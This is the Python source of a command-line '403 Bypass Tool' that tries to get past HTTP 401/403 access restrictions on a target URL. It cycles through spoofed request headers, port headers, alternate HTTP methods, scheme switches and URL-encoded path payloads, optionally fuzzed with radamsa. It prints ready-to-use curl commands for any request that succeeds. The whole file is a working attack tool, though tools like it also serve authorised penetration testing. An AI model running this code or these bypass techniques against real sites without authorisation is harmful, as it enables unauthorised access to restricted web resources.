import argparse
import subprocess
import time
import os
import sys
import logging
from urllib.parse import urlparse
from colorlog import ColoredFormatter
from colorama import Fore, Style
import shutil
import requests
from enum import Enum
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Result(Enum):
    SUCCESS = "SUCCESS"
    INTERESTING = "INTERESTING"
    
termwidth = shutil.get_terminal_size().columns
horizontal_line = '─' * (termwidth - 2)

formatter = ColoredFormatter(
    f"{Style.BRIGHT}%(log_color)s%(message)s%(reset)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    reset=True,
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'bold_red',
    },
)

handler = logging.StreamHandler()
handler.setFormatter(formatter)

logger = logging.getLogger("a00n_logger")
logger.setLevel(logging.DEBUG)
logger.addHandler(handler)

class BannerHelpFormatter(argparse.HelpFormatter):
    def _format_args(self, action, default):
        if action.option_strings:
            if '--help' in action.option_strings:
                banner()
        return super()._format_args(action, default)

def banner():
    banner_text = ''
    try:
        with open('banner.txt', 'r') as file:
            banner_text = ''.join(file.readlines())
        banner_text = banner_text.replace('blue', f'{Fore.BLUE}')
        banner_text = banner_text.replace('red', f'{Fore.RED}')
        banner_text = banner_text.replace('green', f'{Fore.GREEN}')
        banner_text = banner_text.replace('yellow', f'{Fore.YELLOW}')
        banner_text = banner_text.replace('By A00N', f'{Style.BRIGHT}{Fore.RED}B{Fore.YELLOW}y {Fore.CYAN}A{Fore.GREEN}0{Fore.MAGENTA}0{Fore.BLUE}N{Fore.RED}')
        print(f"{Fore.RED} {banner_text} {Style.RESET_ALL}")
    except FileNotFoundError:
        print("Banner file not found.")
    
def add_extra_spaces(text,horizontal_line):
    extra_spaces = ''
    if len(text)>len(horizontal_line):
        extra_spaces = ' ' * (len(horizontal_line) - (len(text)%len(horizontal_line)))
    else:
        extra_spaces = ' ' * (len(horizontal_line) - len(text))
    return text + extra_spaces

def print_result(text,result: Result):
    name = f'─> {result.value} ✅👇'
    extra_spaces = ' ' * (len(horizontal_line) - len(name) - 2)
    color = Fore.GREEN if result == Result.SUCCESS else Fore.YELLOW
    tmp = add_extra_spaces(f' Try it : {text}',horizontal_line)
    banner = (f"{Style.BRIGHT}{color}╭{horizontal_line}╮\n"
          f"├{name}{extra_spaces}│\n"
          f"│{tmp}│\n"
          f"╰{horizontal_line}╯\n")
    print(banner)

def print_subbanner(text):
    horizontal_line = '─' * int(((termwidth - 2) * 0.3))
    name = f'─> METHOD : 💣 {text} 𐐘💥╾━╤デ╦︻ඞා'
    extra_spaces = ' ' * (len(horizontal_line) - len(name) - 4)
    banner = (f"{Style.BRIGHT}{Fore.RED}╭{horizontal_line}╮\n"
          f"├{name}{extra_spaces}│\n"
          f"╰{horizontal_line}╯\n")
    print(banner)

def extract_domain_and_path(target):
    parsed_uri = urlparse(target)
    domain = parsed_uri.netloc
    path = parsed_uri.path
    return domain, path

def header_bypasser(target,normal_request):
    name = 'HEADER BYPASS'
    print_subbanner(name)
    domain, path = extract_domain_and_path(target)
    try:
        with open('payloads/headers.txt', 'r') as file:
            for line in file:
                header = line.strip()
                header = header.replace('domain', domain.split('//')[-1])
                header = header.replace('path', path)
                header_name, header_value = header.strip().split(':', 1)
                header_name = header_name.strip()
                header_value = header_value.strip()
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    header_name: header_value
                }
                try:
                    response = requests.get(target, headers=headers,verify=False)
                    logger.debug(f'Header "{header}" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
                    if response.status_code == normal_request['status_code'] and len(response.content) != normal_request['length']:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H '{header_name}: {header_value}' -v",Result.INTERESTING)
                    if response.status_code != 403 and response.status_code != 401:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H '{header_name}: {header_value}' -v",Result.SUCCESS)
                except Exception as e:
                    logger.critical(f'Request failed for {header} - {e}')
    except KeyboardInterrupt:
        logger.critical("Process interrupted by user. exit")

def protocol_bypasser(target):
    name = 'PROTOCOL BYPASS'
    print_subbanner(name)
    domain, path = extract_domain_and_path(target)
    try:
        response = requests.get(f"http://{domain.split('//')[-1]}", headers={
            'User-Agent': 'Mozilla/5.0',
        },verify=False)
        logger.debug(f'Protocol "HTTP Scheme" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
        if response.status_code != 403 and response.status_code != 401:
            print_result(f"curl -ks 'http://{domain.split('//')[-1]}' -H 'User-Agent: Mozilla/5.0' -v",Result.SUCCESS)
        response = requests.get(f"https://{domain.split('//')[-1]}", headers={
            'User-Agent': 'Mozilla/5.0',
        },verify=False)
        logger.debug(f'Protocol "HTTPs Scheme" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
        if response.status_code != 403 and response.status_code != 401:
            print_result(f"curl -ks 'https://{domain.split('//')[-1]}' -H 'User-Agent: Mozilla/5.0' -v",Result.SUCCESS)
        response = requests.get(target, headers={
            'User-Agent': 'Mozilla/5.0',
            'X-Forwarded-Scheme': 'http'
        },verify=False)
        logger.debug(f'Protocol "X-Forwarded-Scheme: http" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
        if response.status_code != 403 and response.status_code != 401:
            print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H 'X-Forwarded-Scheme: http' -v",Result.SUCCESS)
        response = requests.get(target, headers={
            'User-Agent': 'Mozilla/5.0',
            'X-Forwarded-Scheme': 'https'
        },verify=False)
        logger.debug(f'Protocol "X-Forwarded-Scheme: https" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
        if response.status_code != 403 and response.status_code != 401:
            print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H 'X-Forwarded-Scheme: https' -v",Result.SUCCESS)
    except KeyboardInterrupt:
        logger.critical("Process interrupted by user. exit")
    except Exception as e:
        logger.critical(f'Request failed - {e}')


def port_bypasser(target,normal_request):
    name = 'PORT BYPASS'
    print_subbanner(name)
    domain, path = extract_domain_and_path(target)
    try:
        with open('payloads/ports.txt', 'r') as file:
            for line in file:
                header = line.strip()
                header_name, header_value = header.strip().split(':', 1)
                header_name = header_name.strip()
                header_value = header_value.strip()
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    header_name: header_value
                }
                try:
                    response = requests.get(target, headers=headers)
                    logger.debug(f'Port "{header}" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
                    if response.status_code == normal_request['status_code'] and len(response.content) != normal_request['length']:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H '{header_name}: {header_value}' -v",Result.INTERESTING)
                    if response.status_code != 403 and response.status_code != 401:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -H '{header_name}: {header_value}' -v",Result.SUCCESS)
                except Exception as e:
                    logger.critical(f'Request failed for {header} - {e}')
    except KeyboardInterrupt:
        logger.critical("Process interrupted by user. exit")
        
def http_method_bypasser(target,normal_request):
    name = 'HTTP METHOD BYPASS'
    print_subbanner(name)
    domain, path = extract_domain_and_path(target)
    try:
        with open('payloads/http_methods.txt', 'r') as file:
            for line in file:
                method = line.strip()
                headers = {
                    'User-Agent': 'Mozilla/5.0'
                }
                try:
                    response = requests.request(url=target, headers=headers,method=method)
                    logger.debug(f'Http Method "{method}" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
                    if response.status_code == normal_request['status_code'] and len(response.content) != normal_request['length']:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -X {method} -v",Result.INTERESTING)
                    if response.status_code != 403 and response.status_code != 401 and response.status_code != 405:
                        print_result(f"curl -ks '{target}' -H 'User-Agent: Mozilla/5.0' -X {method} -v",Result.SUCCESS)
                except Exception as e:
                    logger.critical(f'Request failed for {method} - {e}')
    except KeyboardInterrupt:
        logger.critical("Process interrupted by user. exit")

def is_radamsa_installed():
    command_path = shutil.which('radamsa')
    if command_path:
        return True
    else:
        return False

def encode_bypasser(target,normal_request,use_radamsa):
    name = 'ENCODE BYPASS'
    print_subbanner(name)
    domain, path = extract_domain_and_path(target)
    file_path = os.path.join(os.path.dirname(__file__), 'payloads/encodes.txt')
    if not os.path.isfile(file_path):
        logger.critical(f"Error: The file {file_path} does not exist.")
        sys.exit(1)
    with open(file_path, 'r') as file:
        payloads = file.read().splitlines()
    try:
        if use_radamsa:
            if not is_radamsa_installed():
                logger.critical("Radamsa is not installed. Please install it from here https://gitlab.com/akihe/radamsa and try again.")
                sys.exit(1)
            command = (
                f'cat "{file_path}" | while read -r payload; do echo "$payload" | radamsa -n 5 ; done'
            )
            logger.debug(f'Running command to generate more payloads: {command}')
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=False)
            output = result.stdout
            error = result.stderr

            if result.returncode == 0:
                payloads = payloads + list(set(output.decode('utf-8', errors='ignore').splitlines()))
        logger.info(f'{len(payloads)} payloads will be tested. Let\'s go! 😎')
        for payload in payloads:
            payload = payload.strip()
            payload = payload.replace('path', path)
            headers = {
                'User-Agent': 'Mozilla/5.0',
            }
            try:
                response = requests.get(f'{target}/{payload}', headers=headers,verify=False)
                time.sleep(0.1)
                logger.debug(f'Encode "{payload}" : {Fore.YELLOW}Status: {response.status_code}, Length: {len(response.content)}{Style.RESET_ALL}')
                if response.status_code == normal_request['status_code'] and len(response.content) != normal_request['length']:
                    print_result(f"curl -ks '{target}/{payload}' -H 'User-Agent: Mozilla/5.0' -v",Result.INTERESTING)
                if response.status_code != 403 and response.status_code != 401 and response.status_code != 404 and response.status_code != 400:
                    print_result(f"curl -ks '{target}/{payload}' -H 'User-Agent: Mozilla/5.0' -v",Result.SUCCESS)
            except Exception as e:
                logger.critical(f'Request failed for {payload} - {e}')
    except KeyboardInterrupt:
        logger.critical("Process interrupted by user. exit")

def main():
    parser = argparse.ArgumentParser(
        description="403 Bypass Tool",
        formatter_class=BannerHelpFormatter
    )
    parser.add_argument('-u', '--url', required=True, help='target domain (e.g : https://target.com or https://target.com/path)')
    parser.add_argument('-v', '--version', help='print version', action='version', version=f'{Style.BRIGHT}{Fore.BLUE}F0UR{Fore.WHITE}-{Fore.RED}ZER0{Fore.WHITE}-{Fore.GREEN}THREE {Fore.YELLOW}Bypasser {Fore.WHITE}V1.0')

    bypass_modes = parser.add_argument_group('Bypass Modes')
    bypass_modes.add_argument('--header', action='store_true', help='Header Bypass')
    bypass_modes.add_argument('--protocol', action='store_true', help='Protocol Bypass')
    bypass_modes.add_argument('--port', action='store_true', help='Port Bypass')
    bypass_modes.add_argument('--http-method', action='store_true', help='HTTP Method Bypass')
    bypass_modes.add_argument('--encode', action='store_true', help='URL Encode Bypass')
    bypass_modes.add_argument('--use-radamsa', action='store_true', help='Weither or not to use Radamsa. Only applicable with --encode')

    all_bypasses = parser.add_argument_group('All Bypasses')
    all_bypasses.add_argument('--exploit-all', action='store_true', help='Complete Scan: 403/401 bypass modes')

    args = parser.parse_args()
    #print(args)
    logger.debug('Fetching normal request status code and length')
    response = requests.get(args.url,headers={'User-Agent': 'Mozilla/5.0'})
    normal_request = {
        'status_code': response.status_code,
        'length': len(response.content),
    }
    logger.info(f'Normal request: {normal_request}')
    if args.exploit_all:
        header_bypasser(args.url,normal_request)
        port_bypasser(args.url,normal_request)
        http_method_bypasser(args.url,normal_request)
        encode_bypasser(args.url,normal_request,args.use_radamsa)
    else:
        if args.header:
            header_bypasser(args.url,normal_request)
        if args.protocol:
            protocol_bypasser(args.url)
        if args.port:
            port_bypasser(args.url,normal_request)
        if args.http_method:
            http_method_bypasser(args.url,normal_request)
        if args.encode:
            encode_bypasser(args.url,normal_request,args.use_radamsa)

if __name__ == '__main__':
    main()
